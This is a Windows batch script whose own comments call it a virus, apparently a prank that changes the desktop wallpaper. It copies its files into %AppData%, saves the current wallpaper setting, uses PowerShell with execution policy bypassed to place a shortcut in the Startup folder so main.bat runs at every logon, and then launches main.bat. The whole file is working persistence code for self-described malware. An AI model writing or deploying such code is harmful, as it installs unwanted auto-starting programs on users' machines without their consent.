@rem Start le Virus
@echo off

echo Copying The Virus : %AppData%\BackGround_Virus
xcopy /s BackGround %AppData%\BackGround_Virus /Y /I

echo.
echo Get The current value of WallPaper (to restore)
REG QUERY "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Wallpaper" | findstr "REG_SZ" > old_background.txt

echo.
echo Create The ShortCut (To Start every start-up)

set TARGET='%AppData%\BackGround_Virus\main.bat'
set SHORTCUT='%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\background_v.lnk'
set PWS=powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile
%PWS% -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(%SHORTCUT%); $S.TargetPath = %TARGET%; $S.Save()"


echo.
echo Start The Script
"%APPDATA%\BackGround_Virus\main.bat"

pause
exit